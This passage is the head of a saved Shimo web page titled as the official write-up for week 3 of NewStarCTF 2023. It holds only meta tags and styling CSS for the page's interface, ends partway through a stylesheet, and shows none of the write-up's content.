<!DOCTYPE html>
<!-- saved from url=(0043)https://shimo.im/docs/QPMRxzGktzsZnzhz/read -->
<html lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="robots" content="noindex">
        
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no,user-scalable=no">
        <meta name="theme-color" content="#000000">
        <meta name="version" content="1.4.6">
        <link rel="shortcut icon" href="https://as.smgv.cn/from_qbox/doc_favicon.ico">
        <meta name="description" content="石墨文档是一款轻便、简洁的在线协作文档工具，PC端和移动端全覆盖，支持多人同时对文档编辑和评论，让你与他人轻松完成协作撰稿、方案讨论、会议记录和资料共享等工作。">
        <meta name="keywords" content="在线协作文档,在线文档编辑,在线协作编辑,协同编辑,多人编辑,团队协作工具,文档管理工具,文档协作,文件存储,文件共享,协作办公,SAAS,云协作,google docs,在线office">
        <meta name="google" content="notranslate">
        <style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-4201804011 */
.randomClass-keafdv{position:fixed;overflow:auto;top:0;right:0;bottom:0;left:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;z-index:999;-webkit-overflow-scrolling:touch;outline:0;}.sm-modal-mask-hidden{display:none;}
</style><style type="text/css" data-styled-components="sfCUt inYJrZ" data-styled-components-is-local="true">/* sc-component-id: sc-1n784rm-0 */

.sfCUt{box-sizing:border-box;display:inline-block;border-radius:2px;border-width:1px;border-style:solid;background-color:#fff;text-align:center;-webkit-text-decoration:none;text-decoration:none;cursor:pointer;-webkit-transition:opacity 0.3s,border-color 0.3s;transition:opacity 0.3s,border-color 0.3s;color:#666;border-width:0;background-image:linear-gradient(#fdfdfd,#f8f8f8);box-shadow:0 1px 1px 0 rgba(0,0,0,0.11);position:relative;font-size:12px;font-weight:bold;line-height:1.4;min-width:90px;height:30px;line-height:28px;padding:0 15px;}.sfCUt:focus{outline:none;}.sfCUt:active{opacity:0.9;}.sfCUt:hover{background-image:none;}.sfCUt::before{content:'';display:block;position:absolute;top:-1px;left:-1px;z-index:-1;width:100%;height:100%;border:1px solid rgba(65,70,75,0.05);border-radius:2px;-webkit-transition:opacity 0.3s ease-out;transition:opacity 0.3s ease-out;opacity:0;}.sfCUt:hover{border-radius:1px;}.sfCUt:hover::before{opacity:1;}.sfCUt[disabled]{border-radius:1px;}.sfCUt[disabled]::before{opacity:1;}.sfCUt:hover{background-image:linear-gradient(#fdfdfd,#f8f8f8);}.sfCUt:active{box-shadow:0 1px 1px 0 rgba(0,0,0,0.1);background-image:linear-gradient(#f0f0f0,#f7f7f7);}.sfCUt[disabled]{color:#ccc;background-color:#f7f7f7;}.sfCUt[disabled]::before{border-color:rgba(0,0,0,0.05);}.sfCUt[disabled]{cursor:not-allowed;background-image:none;}

.inYJrZ{box-sizing:border-box;display:inline-block;border-radius:2px;border-width:1px;border-style:solid;background-color:#fff;text-align:center;-webkit-text-decoration:none;text-decoration:none;cursor:pointer;-webkit-transition:opacity 0.3s,border-color 0.3s;transition:opacity 0.3s,border-color 0.3s;color:#666;border-width:0;background-image:linear-gradient(#fdfdfd,#f8f8f8);box-shadow:0 1px 1px 0 rgba(0,0,0,0.11);position:relative;font-size:14px;font-weight:bold;line-height:1.4;min-width:100px;height:34px;line-height:32px;padding:0 15px;}.inYJrZ:focus{outline:none;}.inYJrZ:active{opacity:0.9;}.inYJrZ:hover{background-image:none;}.inYJrZ::before{content:'';display:block;position:absolute;top:-1px;left:-1px;z-index:-1;width:100%;height:100%;border:1px solid rgba(65,70,75,0.05);border-radius:2px;-webkit-transition:opacity 0.3s ease-out;transition:opacity 0.3s ease-out;opacity:0;}.inYJrZ:hover{border-radius:1px;}.inYJrZ:hover::before{opacity:1;}.inYJrZ[disabled]{border-radius:1px;}.inYJrZ[disabled]::before{opacity:1;}.inYJrZ:hover{background-image:linear-gradient(#fdfdfd,#f8f8f8);}.inYJrZ:active{box-shadow:0 1px 1px 0 rgba(0,0,0,0.1);background-image:linear-gradient(#f0f0f0,#f7f7f7);}.inYJrZ[disabled]{color:#ccc;background-color:#f7f7f7;}.inYJrZ[disabled]::before{border-color:rgba(0,0,0,0.05);}.inYJrZ[disabled]{cursor:not-allowed;background-image:none;}
</style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-1274816861 */
#ToastsContainer_ShimoUI .Toastify__toast-container{width:100%;text-align:center;height:0;padding:0;margin:0;margin-top:30px;right:0;}#ToastsContainer_ShimoUI .Toastify__toast{box-shadow:none;background:none;cursor:auto;overflow:visible;margin:0;padding:0;display:inline;}#ToastsContainer_ShimoUI .Toastify__toast:after{content:'\a';white-space:pre;}#ToastsContainer_ShimoUI .Toastify__toast-body{display:inline;}#ToastsContainer_ShimoUI .Toast_mask{position:fixed;top:0;left:0;right:0;bottom:0;width:100%;background:transparent;z-index:999999;}
</style><style type="text/css" data-styled-components="gLVbAR kqIoIJ liDUmU" data-styled-components-is-local="true">/* sc-component-id: sc-chPdSV */

.gLVbAR{clear:both;width:816px;margin:0 auto;padding-top:25px;padding-bottom:25px;text-align:center;width:100%;}
/* sc-component-id: sc-kgoBCf */

.kqIoIJ{font-size:12px;color:#a5a5a5;-webkit-font-smoothing:antialiased;}
/* sc-component-id: sc-kGXeez */

.liDUmU{text-align:center;position:fixed;right:20px;bottom:48px;width:60px;height:60px;-webkit-text-decoration:none;text-decoration:none;box-shadow:0px 6px 10px rgba(0,0,0,0.1),0px 4px 16px rgba(0,0,0,0.06), 0px 1px 24px rgba(0,0,0,0.06);line-height:60px;border-radius:30px;font-size:20px;color:#41464b;-webkit-transform:scale(0.5);-ms-transform:scale(0.5);transform:scale(0.5);}
</style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-1193784920 */
.randomClass-dhpOWU.sm-dropdown{position:absolute;left:-9999px;top:-9999px;display:block;z-index:1050;}.randomClass-dhpOWU.sm-dropdown .sm-dropdown-menu{box-shadow:0 2px 8px 0 rgba(0,0,0,0.15);}.randomClass-dhpOWU.sm-dropdown-tip::before{content:'';position:absolute;z-index:-1;display:block;width:10px;height:10px;background-color:#fff;-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg);box-shadow:0 0 6px 0 rgba(0,0,0,0.15);}.randomClass-dhpOWU.sm-dropdown-tip::after{content:'';display:block;position:absolute;border-color:transparent;border-width:6px;border-style:solid;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomLeft::before{left:20px;top:-4px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomLeft::after{left:19px;top:-12px;border-bottom-color:#fff;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomRight::before{right:20px;top:-4px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomRight::after{right:19px;top:-12px;border-bottom-color:#fff;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomCenter::before{left:50%;top:-4px;margin-left:-6px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-bottomCenter::after{left:50%;top:-12px;margin-left:-6px;border-bottom-color:#fff;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topLeft::before{left:20px;bottom:-4px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topLeft::after{left:19px;bottom:-12px;border-top-color:#fff;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topRight::before{right:20px;bottom:-4px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topRight::after{right:19px;bottom:-12px;border-top-color:#fff;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topCenter::before{left:50%;bottom:-4px;margin-left:-6px;}.randomClass-dhpOWU.sm-dropdown-tip.sm-dropdown-placement-topCenter::after{left:50%;bottom:-12px;margin-left:-6px;border-top-color:#fff;}.randomClass-dhpOWU.sm-dropdown-hidden{display:none;}.randomClass-dhpOWU.sm-dropdown-mask{z-index:1050;position:absolute;top:0;bottom:0;left:0;right:0;}.randomClass-dhpOWU.sm-dropdown-mask-hidden{display:none;}
</style><style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-2145721762 */
.randomClass-mvIob{display:block;position:absolute;font-size:12px;-webkit-font-smoothing:auto;line-height:1.375;opacity:1;z-index:1060;}.randomClass-mvIob .sm-tooltip-inner{color:#fff;text-align:center;padding:6px 10px;background:#41464b;border-radius:2px;box-shadow:0 1px 3px 0 rgba(0,0,0,0.1);height:auto;line-height:1.375;white-space:normal;}.randomClass-mvIob.sm-tooltip-hidden{display:none;}.randomClass-mvIob .sm-tooltip-arrow{position:absolute;width:0;height:0;border-color:#41464b;border-style:solid;}.randomClass-mvIob .sm-tooltip-arrow::after{content:'';position:absolute;width:5px;height:5px;-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg);box-shadow:0 0 8px 0 rgba(0,0,0,0.4);z-index:-1;}.randomClass-mvIob.sm-tooltip-theme-blue .sm-tooltip-inner{background:#8ab3e9;}.randomClass-mvIob.sm-tooltip-theme-blue .sm-tooltip-inner{background:#8ab3e9;}.randomClass-mvIob.sm-tooltip-theme-blue .sm-tooltip-arrow{border-color:#8ab3e9;}.randomClass-mvIob.sm-tooltip-theme-white{opacity:1;}.randomClass-mvIob.sm-tooltip-theme-white .sm-tooltip-inner{color:#333;background:#fff;}.randomClass-mvIob.sm-tooltip-theme-white .sm-tooltip-inner{background:#fff;box-shadow:0 2px 8px 0 rgba(0,0,0,0.2);}.randomClass-mvIob.sm-tooltip-theme-white .sm-tooltip-arrow{border-color:#fff;}.randomClass-mvIob.sm-tooltip-theme-white .sm-tooltip-arrow::after{box-shadow:0 0 6px 0 rgba(0,0,0,0.2);}.randomClass-mvIob.sm-tooltip-placement-top,.randomClass-mvIob.sm-tooltip-placement-topLeft,.randomClass-mvIob.sm-tooltip-placement-topRight{padding-bottom:7px;}.randomClass-mvIob.sm-tooltip-placement-top .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-topLeft .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-topRight .sm-tooltip-arrow{bottom:3px;border-width:4px 4px 0;border-bottom-color:transparent;border-left-color:transparent;border-right-color:transparent;}.randomClass-mvIob.sm-tooltip-placement-top .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-topLeft .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-topRight .sm-tooltip-arrow::after{left:-2.5px;top:-6.5px;}.randomClass-mvIob.sm-tooltip-placement-bottom,.randomClass-mvIob.sm-tooltip-placement-bottomLeft,.randomClass-mvIob.sm-tooltip-placement-bottomRight{padding-top:7px;}.randomClass-mvIob.sm-tooltip-placement-bottom .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-bottomLeft .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-bottomRight .sm-tooltip-arrow{top:3px;border-width:0 4px 4px;border-top-color:transparent;border-left-color:transparent;border-right-color:transparent;}.randomClass-mvIob.sm-tooltip-placement-bottom .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-bottomLeft .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-bottomRight .sm-tooltip-arrow::after{left:-2.5px;top:1.5px;box-shadow:0 0 10px 0 rgba(0,0,0,0.2);}.randomClass-mvIob.sm-tooltip-placement-left,.randomClass-mvIob.sm-tooltip-placement-leftTop,.randomClass-mvIob.sm-tooltip-placement-leftBottom{padding-right:7px;}.randomClass-mvIob.sm-tooltip-placement-left .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-leftTop .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-leftBottom .sm-tooltip-arrow{right:3px;border-width:4px 0 4px 4px;border-top-color:transparent;border-bottom-color:transparent;border-right-color:transparent;}.randomClass-mvIob.sm-tooltip-placement-left .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-leftTop .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-leftBottom .sm-tooltip-arrow::after{left:-6.5px;top:-2.5px;}.randomClass-mvIob.sm-tooltip-placement-right,.randomClass-mvIob.sm-tooltip-placement-rightTop,.randomClass-mvIob.sm-tooltip-placement-rightBottom{padding-left:7px;}.randomClass-mvIob.sm-tooltip-placement-right .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-rightTop .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-rightBottom .sm-tooltip-arrow{left:3px;border-width:4px 4px 4px 0;border-top-color:transparent;border-left-color:transparent;border-bottom-color:transparent;}.randomClass-mvIob.sm-tooltip-placement-right .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-rightTop .sm-tooltip-arrow::after,.randomClass-mvIob.sm-tooltip-placement-rightBottom .sm-tooltip-arrow::after{left:1.5px;top:-2.5px;}.randomClass-mvIob.sm-tooltip-placement-top .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-bottom .sm-tooltip-arrow{left:50%;margin-left:-4px;}.randomClass-mvIob.sm-tooltip-placement-topLeft .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-bottomLeft .sm-tooltip-arrow{left:16px;}.randomClass-mvIob.sm-tooltip-placement-topRight .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-bottomRight .sm-tooltip-arrow{right:16px;}.randomClass-mvIob.sm-tooltip-placement-left .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-right .sm-tooltip-arrow{top:50%;margin-top:-4px;}.randomClass-mvIob.sm-tooltip-placement-leftTop .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-rightTop .sm-tooltip-arrow{top:8px;}.randomClass-mvIob.sm-tooltip-placement-leftBottom .sm-tooltip-arrow,.randomClass-mvIob.sm-tooltip-placement-rightBottom .sm-tooltip-arrow{bottom:8px;}
/* sc-component-id: sc-global-3280337108 */
.sm-tooltip.no-touch{pointer-events:none !important;}.sm-tooltip{pointer-events:auto !important;}.sm-tooltip *{pointer-events:auto !important;}
</style><style type="text/css" data-styled-components="bBZnOa cbYHdA iaSppr kOTtUa fWfGDr iAQwBy cuKFxh cZZyrb iObLYz cUDKsr jVcKXm dStWqN" data-styled-components-is-local="true">/* sc-component-id: sc-hzDkRC */

.iObLYz{position:relative;width:38px;min-width:38px;height:28px;margin:11px 15px 11px 0;}.iObLYz path{fill:rgba(65,70,75,0.3);}
/* sc-component-id: sc-jhAzac */

.cUDKsr{position:absolute;top:50%;left:50%;-webkit-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);transform:translate(-50%,-50%);}
/* sc-component-id: sc-fMiknA */

.fWfGDr{pointer-events:none;height:20px;line-height:24px;margin-left:20px;box-shadow:none;background:inherit;max-width:656px;padding-bottom:4px;font-size:14px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
/* sc-component-id: sc-fAjcbJ */

.kOTtUa{display:block;height:18px;margin:16px 0;}.kOTtUa > path{fill:#41464b;}
/* sc-component-id: sc-caSCKo */

.iaSppr{float:left;-webkit-text-decoration:none;text-decoration:none;}
/* sc-component-id: sc-gisBJw */

.cbYHdA{margin-left:20px;}
/* sc-component-id: sc-kvZOFW */

.dStWqN{position:relative;width:38px;min-width:38px;height:28px;margin:11px 18px 11px 0px;}.dStWqN svg{position:absolute;top:50%;left:50%;-webkit-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);transform:translate(-50%,-50%);}
/* sc-component-id: sc-keyframes-bBZnOa */
@-webkit-keyframes bBZnOa{0%{-webkit-transform:rotate(0);-ms-transform:rotate(0);transform:rotate(0);}50%{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg);}100%{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}@keyframes bBZnOa{0%{-webkit-transform:rotate(0);-ms-transform:rotate(0);transform:rotate(0);}50%{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg);}100%{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}
/* sc-component-id: sc-btzYZH */

.jVcKXm{position:relative;width:72px;height:28px;box-sizing:border-box;margin-top:11px;text-align:center;font-size:14px;font-family:serif;font-weight:bold;border-radius:2px;cursor:pointer;}.jVcKXm.register{background:linear-gradient(180deg,#41464b 0%,#2c3033 100%);color:white;margin-right:10px;border:0;}.jVcKXm.login{background:linear-gradient(180deg,#ffffff 0%,#fafafa 98.11%);border:1px solid rgba(65,70,75,0.5);color:rgba(65,70,75,0.9);}.jVcKXm:hover{opacity:0.9;}
/* sc-component-id: sc-lhVmIH */

.iAQwBy{position:relative;width:8px;height:30px;padding:0;margin:10px 0 10px 15px;cursor:pointer;background-color:#fff;border:none;}.iAQwBy svg{position:absolute;top:calc(50% - 1px);left:50%;-webkit-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);transform:translate(-50%,-50%);}
/* sc-component-id: sc-bYSBpT */

.cZZyrb{vertical-align:bottom;margin-right:5px;}
/* sc-component-id: sc-elJkPf */

.cuKFxh{position:relative;height:12px;line-height:12px;margin:19px 0 19px 20px;font-size:12px;color:#a5a5a5;}
</style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-3361459923 */
.header-download-app .sm-modal-close{top:12px;right:12px;}
</style><style type="text/css" data-styled-components="doEjVX jqmOiT hAHnBB" data-styled-components-is-local="true">/* sc-component-id: sc-exAgwC */

.doEjVX{white-space:nowrap;width:100%;position:relative;background:linear-gradient(180deg,#fdfdfd,#fff);z-index:110;height:50px;box-shadow:0 2px 3px 0 rgba(100,100,100,0.15);-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;overflow:hidden;border-bottom:1px solid #fff;}.doEjVX::after{clear:both;content:'';display:table;}
/* sc-component-id: sc-cQFLBn */

.jqmOiT{position:relative;float:left;padding-left:0px;}.jqmOiT > a,.jqmOiT > div,.jqmOiT > button{display:inline-block;vertical-align:middle;}
/* sc-component-id: sc-gojNiO */

.hAHnBB{position:absolute;right:0;background-color:white;}.hAHnBB > a,.hAHnBB > div,.hAHnBB > button,.hAHnBB > span{float:left;vertical-align:middle;margin-right:10px;}
</style><style type="text/css" data-styled-components="" data-styled-components-is-local="false">/* sc-component-id: sc-global-2858897182 */
html{line-height:1.15;-webkit-text-size-adjust:100%;}body{margin:0;}main{display:block;}h1{font-size:2em;margin:0.67em 0;}hr{box-sizing:content-box;height:0;overflow:visible;}pre{font-family:monospace,monospace;font-size:1em;}a{background-color:transparent;}abbr[title]{border-bottom:none;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;}b,strong{font-weight:bolder;}code,kbd,samp{font-family:monospace,monospace;font-size:1em;}small{font-size:80%;}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline;}sub{bottom:-0.25em;}sup{top:-0.5em;}img{border-style:none;}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0;}button,input{overflow:visible;}button,select{text-transform:none;}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0;}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText;}fieldset{padding:0.35em 0.75em 0.625em;}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal;}progress{vertical-align:baseline;}textarea{overflow:auto;}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0;}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto;}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px;}[type="search"]::-webkit-search-decoration{-webkit-appearance:none;}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit;}details{display:block;}summary{display:list-item;}template{display:none;}[hidden]{display:none;}body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC",Helvetica,Tahoma,Arial,"Microsoft YaHei",微软雅黑,黑体,Heiti,sans-serif,SimSun,宋体,serif;background-color:#F7F7F7;}*{margin:0;padding:0;outline:none;}button,input,optgroup,select,textarea{font-family:inherit;}.hide{display:none;}@media screen and (-webkit-min-device-pixel-ratio:2),screen and (min-resolution:2dppx){body{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;}}
</style>
<link href="./NewStarCTF 2023 Week3 官方WriteUp_files/doc-8c8f5ec1e6.css" rel="stylesheet"><style>.ql-snow [ql-global]{}</style>
        <title>NewStarCTF 2023 Week3 官方WriteUp</title>
    <style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style><style type="text/css">.Toastify__toast-container {
  z-index: 9999;
  position: fixed;
  padding: 4px;
  width: 320px;
  box-sizing: border-box;
  color: #fff; }
  .Toastify__toast-container--top-left {
    top: 1em;
    left: 1em; }
  .Toastify__toast-container--top-center {
    top: 1em;
    left: 50%;
    margin-left: -160px; }
  .Toastify__toast-container--top-right {
    top: 1em;
    right: 1em; }
  .Toastify__toast-container--bottom-left {
    bottom: 1em;
    left: 1em; }
  .Toastify__toast-container--bottom-center {
    bottom: 1em;
    left: 50%;
    margin-left: -160px; }
  .Toastify__toast-container--bottom-right {
    bottom: 1em;
    right: 1em; }

@media only screen and (max-width: 480px) {
  .Toastify__toast-container {
    width: 100vw;
    padding: 0;
    left: 0;
    margin: 0; }
    .Toastify__toast-container--top-left, .Toastify__toast-container--top-center, .Toastify__toast-container--top-right {
      top: 0; }
    .Toastify__toast-container--bottom-left, .Toastify__toast-container--bottom-center, .Toastify__toast-container--bottom-right {
      bottom: 0; }
    .Toastify__toast-container--rtl {
      right: 0;
      left: initial; } }

.Toastify__toast {
  position: relative;
  min-height: 64px;
  box-sizing: border-box;
  margin-bottom: 1rem;
  padding: 8px;
  border-radius: 1px;
  box-shadow: 0 1px 10px 0 rgba(0, 0, 0, 0.1), 0 2px 15px 0 rgba(0, 0, 0, 0.05);
  display: flex;
  justify-content: space-between;
  max-height: 800px;
  overflow: hidden;
  font-family: sans-serif;
  cursor: pointer;
  direction: ltr; }
  .Toastify__toast--rtl {
    direction: rtl; }
  .Toastify__toast--default {
    background: #fff;
    color: #aaa; }
  .Toastify__toast--info {
    background: #3498db; }
  .Toastify__toast--success {
    background: #07bc0c; }
  .Toastify__toast--warning {
    background: #f1c40f; }
  .Toastify__toast--error {
    background: #e74c3c; }
  .Toastify__toast-body {
    margin: auto 0;
    flex: 1; }

@media only screen and (max-width: 480px) {
  .Toastify__toast {
    margin-bottom: 0; } }

.Toastify__close-button {
  color: #fff;
  font-weight: bold;
  font-size: 14px;
  background: transparent;
  outline: none;
  border: none;
  padding: 0;
  cursor: pointer;
  opacity: 0.7;
  transition: 0.3s ease;
  align-self: flex-start; }
  .Toastify__close-button--default {
    color: #000;
    opacity: 0.3; }
  .Toastify__close-button:hover, .Toastify__close-button:focus {
    opacity: 1; }

@-webkit-keyframes Toastify__trackProgress {
  0% {
    width: 100%; }
  100% {
    width: 0; } }

@keyframes Toastify__trackProgress {
  0% {
    width: 100%; }
  100% {
    width: 0; } }

.Toastify__progress-bar {
  position: absolute;
  bottom: 0;
  left: 0;
  width: 0;
  height: 5px;
  z-index: 9999;
  opacity: 0.7;
  -webkit-animation: Toastify__trackProgress linear 1;
          animation: Toastify__trackProgress linear 1;
  background-color: rgba(255, 255, 255, 0.7); }
  .Toastify__progress-bar--rtl {
    right: 0;
    left: initial; }
  .Toastify__progress-bar--default {
    background: linear-gradient(to right, #4cd964, #5ac8fa, #007aff, #34aadc, #5856d6, #ff2d55); }

@-webkit-keyframes Toastify__bounceInRight {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  from {
    opacity: 0;
    -webkit-transform: translate3d(3000px, 0, 0);
            transform: translate3d(3000px, 0, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(-25px, 0, 0);
            transform: translate3d(-25px, 0, 0); }
  75% {
    -webkit-transform: translate3d(10px, 0, 0);
            transform: translate3d(10px, 0, 0); }
  90% {
    -webkit-transform: translate3d(-5px, 0, 0);
            transform: translate3d(-5px, 0, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@keyframes Toastify__bounceInRight {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  from {
    opacity: 0;
    -webkit-transform: translate3d(3000px, 0, 0);
            transform: translate3d(3000px, 0, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(-25px, 0, 0);
            transform: translate3d(-25px, 0, 0); }
  75% {
    -webkit-transform: translate3d(10px, 0, 0);
            transform: translate3d(10px, 0, 0); }
  90% {
    -webkit-transform: translate3d(-5px, 0, 0);
            transform: translate3d(-5px, 0, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@-webkit-keyframes Toastify__bounceOutRight {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(-20px, 0, 0);
            transform: translate3d(-20px, 0, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(2000px, 0, 0);
            transform: translate3d(2000px, 0, 0); } }

@keyframes Toastify__bounceOutRight {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(-20px, 0, 0);
            transform: translate3d(-20px, 0, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(2000px, 0, 0);
            transform: translate3d(2000px, 0, 0); } }

@-webkit-keyframes Toastify__bounceInLeft {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  0% {
    opacity: 0;
    -webkit-transform: translate3d(-3000px, 0, 0);
            transform: translate3d(-3000px, 0, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(25px, 0, 0);
            transform: translate3d(25px, 0, 0); }
  75% {
    -webkit-transform: translate3d(-10px, 0, 0);
            transform: translate3d(-10px, 0, 0); }
  90% {
    -webkit-transform: translate3d(5px, 0, 0);
            transform: translate3d(5px, 0, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@keyframes Toastify__bounceInLeft {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  0% {
    opacity: 0;
    -webkit-transform: translate3d(-3000px, 0, 0);
            transform: translate3d(-3000px, 0, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(25px, 0, 0);
            transform: translate3d(25px, 0, 0); }
  75% {
    -webkit-transform: translate3d(-10px, 0, 0);
            transform: translate3d(-10px, 0, 0); }
  90% {
    -webkit-transform: translate3d(5px, 0, 0);
            transform: translate3d(5px, 0, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@-webkit-keyframes Toastify__bounceOutLeft {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(20px, 0, 0);
            transform: translate3d(20px, 0, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(-2000px, 0, 0);
            transform: translate3d(-2000px, 0, 0); } }

@keyframes Toastify__bounceOutLeft {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(20px, 0, 0);
            transform: translate3d(20px, 0, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(-2000px, 0, 0);
            transform: translate3d(-2000px, 0, 0); } }

@-webkit-keyframes Toastify__bounceInUp {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, 3000px, 0);
            transform: translate3d(0, 3000px, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
            transform: translate3d(0, -20px, 0); }
  75% {
    -webkit-transform: translate3d(0, 10px, 0);
            transform: translate3d(0, 10px, 0); }
  90% {
    -webkit-transform: translate3d(0, -5px, 0);
            transform: translate3d(0, -5px, 0); }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@keyframes Toastify__bounceInUp {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, 3000px, 0);
            transform: translate3d(0, 3000px, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
            transform: translate3d(0, -20px, 0); }
  75% {
    -webkit-transform: translate3d(0, 10px, 0);
            transform: translate3d(0, 10px, 0); }
  90% {
    -webkit-transform: translate3d(0, -5px, 0);
